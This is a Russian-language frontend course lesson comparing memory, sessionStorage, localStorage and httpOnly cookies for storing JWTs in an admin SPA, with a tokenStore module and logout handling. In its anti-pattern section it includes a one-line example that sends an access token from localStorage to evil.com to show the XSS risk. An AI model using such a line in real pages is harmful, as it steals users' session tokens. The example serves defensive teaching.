# 09. Хранение токенов: memory, localStorage, cookies

## Сценарий с работы

После [08-jwt-basics.md](08-jwt-basics.md) команда спорит где хранить tokens. Junior: «localStorage — проще всего, переживёт F5». Security: «XSS на admin = game over». Senior: «Access в memory, refresh в httpOnly cookie — но нужен BFF». PM: «Пользователь не должен логиниться каждые 15 минут».

Нет silver bullet — trade-offs. mock-exams admin SPA использует **прагматичную** схему: access + refresh в **memory** на dev; опционально refresh в sessionStorage для пережить reload; production path — cookies через nginx/BFF ([35-security-client.md](35-security-client.md)).

## Что вы узнаете

- Сравнение **memory**, **sessionStorage**, **localStorage**, **httpOnly cookies**.
- `tokenStore` module без React.
- Persist refresh — pros/cons.
- Sync с `setAccessTokenGetter` ([04-api-client.md](04-api-client.md)).
- Logout и clear all storages.

---

## Threat model (кратко)

| Вектор | memory | localStorage | httpOnly cookie |
|--------|--------|--------------|-----------------|
| XSS steal token | пока tab open | **да, persist** | refresh защищён* |
| F5 / new tab | **потеря access** | survive | survive |
| CSRF | низкий | низкий | **нужен CSRF token** |
| Dev ergonomics | средняя | высокая | сложнее |

\* httpOnly — JS не читает; XSS не `document.cookie` refresh.

Admin SPA с rich text / third-party scripts — осторожнее с localStorage.

---

## Рекомендация mock-exams (intermediate)

```text
access token   →  memory (tokenStore)
refresh token  →  memory; optional sessionStorage key "shop_refresh"
user snapshot  →  memory (+ Context)
```

После F5 без persist — redirect login. Для лаб удобно sessionStorage refresh — **осознанный компромисс**, не production default.

---

## tokenStore module

```typescript
// features/auth/tokenStore.ts
const REFRESH_KEY = "shop_admin_refresh";

let accessToken: string | null = null;
let refreshToken: string | null = null;

function loadRefreshFromSession(): string | null {
  try {
    return sessionStorage.getItem(REFRESH_KEY);
  } catch {
    return null;
  }
}

function saveRefreshToSession(token: string | null) {
  try {
    if (token) sessionStorage.setItem(REFRESH_KEY, token);
    else sessionStorage.removeItem(REFRESH_KEY);
  } catch {
    /* private mode */
  }
}

// Init on module load (optional persist)
refreshToken = loadRefreshFromSession();

export const tokenStore = {
  getAccess: () => accessToken,
  getRefresh: () => refreshToken,

  setTokens(access: string, refresh: string) {
    accessToken = access;
    refreshToken = refresh;
    saveRefreshToSession(refresh);
  },

  setAccess(access: string) {
    accessToken = access;
  },

  clear() {
    accessToken = null;
    refreshToken = null;
    saveRefreshToSession(null);
  },
};
```

**Не** кладите access в sessionStorage — кор короткий, XSS window меньше если только memory.

---

## Wire to API client

```typescript
// app/setupApiAuth.ts
import { setAccessTokenGetter } from "@/api/client";
import { tokenStore } from "@/features/auth/tokenStore";

export function setupApiAuth() {
  setAccessTokenGetter(() => tokenStore.getAccess());
}
```

Вызовите в `main.tsx` до render или в `AuthProvider` mount:

```tsx
setupApiAuth();
```

---

## Login: write tokens

```typescript
// features/auth/hooks/useLoginMutation.ts — onSuccess in AuthProvider
mutation.mutate(credentials, {
  onSuccess: (data) => {
    tokenStore.setTokens(data.access, data.refresh);
    // user → Context state [10-auth-context.md]
  },
});
```

---

## Logout: clear everything

```typescript
export function logout(queryClient: QueryClient) {
  tokenStore.clear();
  queryClient.clear(); // или removeQueries auth-sensitive
  // navigate /login
}
```

Забытый refresh в sessionStorage → «zombie re-login» после logout — баг QA.

---

## localStorage anti-pattern (учебный пример)

```typescript
// ✗ не используйте в production admin без понимания риска
localStorage.setItem("access", access);
```

Любой script на странице:

```javascript
fetch("https://evil.com/?t=" + localStorage.getItem("access"));
```

Code review на Middle+ должен ловить `localStorage` + JWT.

---

## httpOnly cookie path (обзор)

```text
Browser  →  POST /login  →  Set-Cookie: refresh=...; HttpOnly; Secure; SameSite
SPA      →  memory access from JSON body
API      →  cookie auto on refresh endpoint (same site)
```

Требует same-site deploy, CSRF protection, часто **BFF** (nodejs-intermediate). Django может выставить cookie — frontend config в [36-production-build.md](36-production-build.md).

---

## Tab sync (optional)

`storage` event на localStorage **не** срабатывает для memory. Multi-tab logout:

```typescript
// broadcast channel или localStorage "logout_at" flag
window.addEventListener("storage", (e) => {
  if (e.key === "shop_logout") tokenStore.clear();
});
```

Для admin — nice-to-have.

---

## MSW и storage

MSW login возвращает fake tokens — storage flow **идентичен** real API. Можно тестировать logout без Django.

---

## Persist user snapshot

```typescript
// optional — не JWT
sessionStorage.setItem("shop_user", JSON.stringify(user));
```

Для header «admin@shop.local» до refresh user endpoint. Invalid if tempered — always re-fetch `/me` if exists.

---

## Comparison table для interview

| Storage | Survives F5 | XSS steal | Implementation |
|---------|-------------|-----------|----------------|
| Memory | ✗ | session only | tokenStore |
| sessionStorage | ✓ tab | ✓ if stored | refresh only |
| localStorage | ✓ forever | ✓ persist | avoid access |
| httpOnly cookie | ✓ | refresh protected | BFF/cookie login |

---

## Типичные ошибки

1. **Access в localStorage «временно»** — три года в prod.

2. **Logout без clear sessionStorage** — auto re-auth surprise.

3. **Refresh в Authorization на GET /products** — wrong.

4. **tokenStore import в каждом компоненте** — только auth module + client getter.

5. **SSR leak** — tokens in window.__INITIAL__ (Next — позже).

6. **Git commit .env with secrets** — JWT secret server-only.

---

## Чек-лист

- [ ] `tokenStore` с get/set/clear
- [ ] `setAccessTokenGetter` wired
- [ ] Понимаете почему access в memory
- [ ] Logout очищает store + Query
- [ ] Знаете upgrade path httpOnly cookies

## Далее

Следующий урок: [10. AuthProvider, useAuth, синхронизация с Query](10-auth-context.md).
